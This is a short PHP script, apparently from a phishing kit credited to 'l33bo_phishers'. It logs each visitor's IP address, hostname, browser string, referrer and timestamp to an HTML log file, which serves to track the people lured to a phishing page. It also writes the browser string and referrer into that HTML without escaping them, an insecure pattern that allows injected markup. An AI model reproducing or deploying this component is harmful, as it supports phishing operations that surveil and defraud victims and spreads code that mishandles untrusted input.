<?php
/*
Created by l33bo_phishers -- icq: 695059760 
*/
date_default_timezone_set('Asia/Jakarta');
$v_ip = $_SERVER['REMOTE_ADDR'];
$v_date = date("l d F H:i:s");
$v_agent = $_SERVER['HTTP_USER_AGENT'];
$v_host = gethostbyaddr($v_ip);
$v_referer = $_SERVER['HTTP_REFERER'];


$msg = "
<font color='blue'>Visitor From |  IP : ".$v_ip." - Date : ".$v_date." - Browser : ".$v_agent." - Host : ".$v_host." - Referer : ".$v_referer."<br></font>";
$file=fopen("assets/logs/visitorlog.html","a");
fwrite($file, $msg);
fclose($file);

?>